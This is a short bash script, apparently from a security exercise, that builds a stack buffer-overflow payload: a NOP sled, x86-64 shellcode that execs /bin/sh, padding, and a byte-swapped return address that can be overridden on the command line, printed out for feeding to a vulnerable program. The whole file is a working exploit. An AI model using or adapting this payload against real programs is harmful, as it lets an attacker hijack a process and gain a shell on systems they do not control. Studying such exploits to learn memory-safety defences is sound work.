RETURN_ADDR=7fffffffd2cd

usage()
{
	echo "Usage: ./shellcode.sh [test-addr]"
	echo
	echo "  Where test-addr is a return address on the stack to be tested."
	echo "  If test-addr is not provided, the default value $RETURN_ADDR" \
		  "is used."
	echo
}

fix_addr()
{
	echo -n $1 | sed 's/\(..\)\(..\)\(..\)\(..\)\(..\)\(..\)/\\x\6\\x\5\\x\4\\x\3\\x\2\\x\1\\x00\\x00/g'
}

case $# in
	0)
		# using default return address: 7fffffffd2cd
		;;
	1)
		RETURN_ADDR=$1;;
	*)
		usage
		exit -1;;
esac

NOPS=$(python -c 'print "\x90"*133')
EXECVE="\x48\x8d\x05\x3c\x11\x11\x11\x48\x2d\x11\x11\x11\x11\xff\xe0\x48\x31\xc0\x48\x89\x44\x24\x08\x48\x8b\x3c\x24\x88\x47\x07\x48\x89\xe6\x48\x8b\x54\x24\x08\xb8\x4c\x11\x11\x11\x2d\x11\x11\x11\x11\x0f\x05\x48\x8d\x05\xd6\xff\xff\xff\xff\xd0\x2f\x62\x69\x6e\x2f\x73\x68"
PADDING=$(python -c 'print "\xff"*65')
ADDR="`fix_addr $RETURN_ADDR`"

SHELLCODE=$NOPS$EXECVE$PADDING$ADDR
printf $SHELLCODE

